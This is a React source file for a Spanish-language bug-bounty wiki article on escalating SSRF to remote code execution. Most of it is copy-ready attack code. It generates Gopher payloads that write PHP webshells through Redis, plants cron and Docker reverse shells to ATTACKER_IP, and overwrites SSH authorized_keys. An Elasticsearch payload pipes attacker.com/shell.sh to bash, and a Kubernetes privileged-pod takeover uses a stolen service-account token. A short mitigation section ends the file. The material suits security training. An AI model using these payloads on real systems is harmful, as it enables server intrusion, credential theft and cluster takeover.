/**
 * SSRF TO RCE
 * Escalar SSRF a Remote Code Execution
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Zap, Server, Terminal, Shield, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function SSRFToRCEContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="De SSRF a RCE - La Escalación Definitiva">
        <Paragraph>
          Un <Strong>SSRF (Server-Side Request Forgery)</Strong> básico permite leer datos internos. 
          Pero con las técnicas correctas, puede escalarse a <Strong>Remote Code Execution</Strong>, 
          permitiendo ejecutar comandos arbitrarios en el servidor.
        </Paragraph>

        <AlertDanger title="Vectores de Escalación">
          <ul className="mt-2 space-y-1">
            <ListItem>⚡ Gopher protocol → Exploit servicios internos</ListItem>
            <ListItem>📦 Redis sin autenticación → Escribir webshell</ListItem>
            <ListItem>🐘 Memcached → Code injection</ListItem>
            <ListItem>🔥 Elasticsearch → Groovy script execution</ListItem>
            <ListItem>🐋 Docker API → Container escape</ListItem>
            <ListItem>☸️ Kubernetes API → Cluster takeover</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="gopher-protocol" title="1. Gopher Protocol - El Protocolo Mágico">
        <Paragraph>
          <Strong>Gopher</Strong> es un protocolo antiguo que permite enviar datos raw TCP. 
          Muchas librerías HTTP (curl, urllib) lo soportan, permitiendo atacar servicios 
          que no son HTTP (Redis, MySQL, SMTP, etc.).
        </Paragraph>

        <Subsection title="Sintaxis de Gopher">
          <CodeBlock
            language="text"
            code={`gopher://host:port/_<datos_raw_url_encoded>

Ejemplo:
gopher://127.0.0.1:6379/_SET%20mykey%20myvalue`}
          />
        </Subsection>

        <Subsection title="SSRF a Redis RCE">
          <CodeBlock
            language="python"
            title="Generar payload Gopher para Redis"
            code={`import urllib.parse

# Comandos Redis para escribir webshell
redis_commands = [
    "FLUSHALL",
    "SET mykey '<?php system($_GET[\"cmd\"]); ?>'",
    "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php",
    "SAVE",
    "QUIT"
]

# Convertir a protocolo Redis (CRLF separado)
redis_payload = "".join([cmd + "\\r\\n" for cmd in redis_commands])

# URL encode
gopher_payload = urllib.parse.quote(redis_payload)

# Gopher URL final
gopher_url = f"gopher://127.0.0.1:6379/_{gopher_payload}"

print("SSRF Payload:")
print(gopher_url)

# Usar en SSRF vulnerable:
# curl "http://vulnerable.com/fetch?url={gopher_url}"`}
          />

          <AlertWarning title="Resultado">
            Esto escribe <InlineCode>shell.php</InlineCode> en <InlineCode>/var/www/html/</InlineCode>. 
            Luego acceder a <InlineCode>http://vulnerable.com/shell.php?cmd=id</InlineCode> ejecuta comandos.
          </AlertWarning>
        </Subsection>

        <Subsection title="Double URL Encoding Bypass">
          <CodeBlock
            language="python"
            title="Bypass de filtros con doble encoding"
            code={`# Algunos WAFs bloquean "gopher://"
# Bypass con doble URL encoding

original = "gopher://127.0.0.1:6379/_SET..."

# Primera codificación
once = urllib.parse.quote(original)
# gopher%3A%2F%2F127.0.0.1%3A6379...

# Segunda codificación
twice = urllib.parse.quote(once)
# gopher%253A%252F%252F127.0.0.1%253A6379...

# El servidor decodifica 2 veces y ejecuta gopher://`}
          />
        </Subsection>
      </Section>

      <Section id="redis-rce" title="2. Redis sin Auth → RCE Completo">
        <Subsection title="Método 1: Webshell PHP">
          <CodeBlock
            language="bash"
            title="Payload Gopher completo"
            code={`# 1. Generar comandos Redis
cat > redis_commands.txt <<'EOF'
FLUSHALL
SET shell '<?php eval($_POST["cmd"]); ?>'
CONFIG SET dir /var/www/html
CONFIG SET dbfilename evil.php
SAVE
QUIT
EOF

# 2. Convertir a Gopher
python3 << 'PYTHON'
import urllib.parse

with open('redis_commands.txt') as f:
    commands = f.read()

# Protocolo Redis
payload = "".join([line + "\\r\\n" for line in commands.split("\\n")])
encoded = urllib.parse.quote(payload)

print(f"gopher://127.0.0.1:6379/_{encoded}")
PYTHON`}
          />
        </Subsection>

        <Subsection title="Método 2: Cron Job para Reverse Shell">
          <CodeBlock
            language="bash"
            title="Redis → Cron → Shell"
            code={`# Escribir cron job malicioso
SET cronshell "\\n\\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\\n\\n"
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SAVE

# Esperar 1 minuto, el cron ejecutará el reverse shell`}
          />
        </Subsection>

        <Subsection title="Método 3: SSH Authorized Keys">
          <CodeBlock
            language="bash"
            title="Redis → SSH Key → Access"
            code={`# Generar par de claves SSH
ssh-keygen -t rsa -f exploit_key

# Leer clave pública
cat exploit_key.pub

# Payload Redis
SET sshkey "\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil\\n\\n"
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SAVE

# Conectar via SSH
ssh -i exploit_key root@target_server`}
          />
        </Subsection>
      </Section>

      <Section id="memcached-rce" title="3. Memcached → Code Injection">
        <CodeBlock
          language="python"
          title="Gopher payload para Memcached"
          code={`import urllib.parse

# Memcached usa protocolo de texto simple
memcached_payload = """
set exploit 0 0 100
<?php system($_GET['cmd']); ?>
quit
"""

# URL encode
encoded = urllib.parse.quote(memcached_payload.strip())

gopher_url = f"gopher://127.0.0.1:11211/_{encoded}"

print(gopher_url)

# Si la app guarda resultado en archivo cache accesible:
# http://vulnerable.com/cache/exploit
# → Ejecuta PHP`}
        />
      </Section>

      <Section id="elasticsearch-rce" title="4. Elasticsearch → Groovy RCE">
        <Subsection title="Pre-5.0: Groovy Sandbox Escape">
          <CodeBlock
            language="json"
            title="Payload - Ejecutar comandos via Groovy"
            code={`POST /_search HTTP/1.1
Host: 127.0.0.1:9200
Content-Type: application/json

{
  "size": 1,
  "script_fields": {
    "exploit": {
      "script": "java.lang.Runtime.getRuntime().exec('curl http://attacker.com/shell.sh | bash').getText()"
    }
  }
}`}
          />

          <CodeBlock
            language="python"
            title="Via SSRF con POST data"
            code={`# Si SSRF permite POST, enviar payload JSON
import requests
import json

payload = {
    "size": 1,
    "script_fields": {
        "exploit": {
            "script": "java.lang.Runtime.getRuntime().exec('id').getText()"
        }
    }
}

# Endpoint SSRF vulnerable
ssrf_url = "http://vulnerable.com/fetch"

# Payload que hace POST a Elasticsearch interno
response = requests.post(ssrf_url, json={
    "url": "http://127.0.0.1:9200/_search",
    "method": "POST",
    "body": json.dumps(payload)
})`}
          />
        </Subsection>
      </Section>

      <Section id="docker-api" title="5. Docker API → Container Escape">
        <Paragraph>
          Si Docker API está expuesto en <InlineCode>http://127.0.0.1:2375</InlineCode> 
          sin autenticación, puedes crear contenedores privilegiados y escapar al host.
        </Paragraph>

        <CodeBlock
          language="bash"
          title="SSRF → Docker API → RCE"
          code={`# 1. Listar contenedores
curl "http://vulnerable.com/fetch?url=http://127.0.0.1:2375/containers/json"

# 2. Crear contenedor privilegiado con volumen del host montado
curl "http://vulnerable.com/fetch?url=http://127.0.0.1:2375/containers/create" \\
  -X POST \\
  -H "Content-Type: application/json" \\
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "chroot /host && bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\""],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }'

# 3. Start container
curl "http://vulnerable.com/fetch?url=http://127.0.0.1:2375/containers/CONTAINER_ID/start" -X POST`}
        />

        <AlertDanger>
          Con <InlineCode>Privileged: true</InlineCode> y <InlineCode>Binds: ["/:/host"]</InlineCode>, 
          el contenedor tiene acceso completo al filesystem del host.
        </AlertDanger>
      </Section>

      <Section id="kubernetes-api" title="6. Kubernetes API → Cluster Takeover">
        <CodeBlock
          language="bash"
          title="SSRF → K8s API → Create privileged pod"
          code={`# Kubernetes API suele estar en https://kubernetes.default.svc
# Token en /var/run/secrets/kubernetes.io/serviceaccount/token

# 1. Leer service account token (si SSRF permite file://)
curl "http://vulnerable.com/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"

# 2. Crear pod privilegiado
curl "http://vulnerable.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces/default/pods" \\
  -H "Authorization: Bearer $TOKEN" \\
  -X POST \\
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "evil-pod"},
    "spec": {
      "hostNetwork": true,
      "hostPID": true,
      "containers": [{
        "name": "shell",
        "image": "alpine",
        "command": ["/bin/sh"],
        "stdin": true,
        "tty": true,
        "securityContext": {
          "privileged": true
        },
        "volumeMounts": [{
          "name": "host",
          "mountPath": "/host"
        }]
      }],
      "volumes": [{
        "name": "host",
        "hostPath": {"path": "/"}
      }]
    }
  }'`}
        />
      </Section>

      <Section id="herramientas" title="7. Herramientas de Explotación">
        <Subsection title="Gopherus - Generador de Payloads">
          <CodeBlock
            language="bash"
            title="Gopherus - Automatizar payloads Gopher"
            code={`git clone https://github.com/tarunkant/Gopherus
cd Gopherus
./gopherus.py

# Opciones:
# 1. MySQL
# 2. PostgreSQL
# 3. FastCGI
# 4. Redis
# 5. Zabbix
# 6. Memcached
# 7. SMTP

# Ejemplo: Redis
./gopherus.py --exploit redis

# Input: Your Redis Command
# > config set dir /var/www/html
# > config set dbfilename shell.php
# > set test "<?php system($_GET['cmd']); ?>"
# > save

# Output: gopher://127.0.0.1:6379/...`}
          />
        </Subsection>

        <Subsection title="SSRFmap - Testing Automático">
          <CodeBlock
            language="bash"
            title="SSRFmap - Exploit SSRF automáticamente"
            code={`git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Escanear SSRF
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Módulos disponibles:
# - readfiles: Leer archivos locales
# - redis: Exploit Redis
# - mysql: Exploit MySQL
# - portscan: Escanear puertos internos
# - aws: AWS metadata`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Defensa en Profundidad">
          Múltiples capas de protección necesarias.
        </AlertDanger>

        <Subsection title="1. Deshabilitar Protocolos Peligrosos">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Solo HTTP/HTTPS"
            code={`const axios = require('axios');

// ✅ Interceptor para bloquear protocolos peligrosos
axios.interceptors.request.use(config => {
  const url = new URL(config.url);
  
  // Solo permitir HTTP/HTTPS
  const allowedProtocols = ['http:', 'https:'];
  
  if (!allowedProtocols.includes(url.protocol)) {
    throw new Error(\`Protocol \${url.protocol} not allowed\`);
  }
  
  return config;
});`}
          />
        </Subsection>

        <Subsection title="2. Firewall de Salida Estricto">
          <CodeBlock
            language="bash"
            title="✅ iptables - Bloquear acceso a servicios internos"
            code={`# Bloquear acceso del servidor web a servicios internos
# Redis
iptables -A OUTPUT -p tcp --dport 6379 -j REJECT

# MySQL
iptables -A OUTPUT -p tcp --dport 3306 -j REJECT

# PostgreSQL
iptables -A OUTPUT -p tcp --dport 5432 -j REJECT

# Memcached
iptables -A OUTPUT -p tcp --dport 11211 -j REJECT

# Elasticsearch
iptables -A OUTPUT -p tcp --dport 9200 -j REJECT

# Docker API
iptables -A OUTPUT -p tcp --dport 2375 -j REJECT

# Metadata
iptables -A OUTPUT -d 169.254.169.254 -j REJECT`}
          />
        </Subsection>

        <Subsection title="3. Network Segmentation">
          <CodeBlock
            language="yaml"
            title="✅ Docker Compose - Redes separadas"
            code={`version: '3'
services:
  web:
    image: myapp
    networks:
      - public
    # NO tiene acceso a red interna
  
  redis:
    image: redis
    networks:
      - internal
    # NO expuesto a internet
  
  mysql:
    image: mysql
    networks:
      - internal

networks:
  public:
    driver: bridge
  internal:
    driver: bridge
    internal: true  # ← Sin acceso a internet`}
          />
        </Subsection>

        <Subsection title="4. Autenticación en Servicios Internos">
          <CodeBlock
            language="conf"
            title="✅ Redis - Require password"
            code={`# redis.conf
requirepass YourStrongPasswordHere123!

# Bind solo a localhost
bind 127.0.0.1

# Renombrar comandos peligrosos
rename-command CONFIG ""
rename-command FLUSHALL ""
rename-command FLUSHDB ""`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: GraphQL Injection</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/graphql-injection`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar APIs GraphQL</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
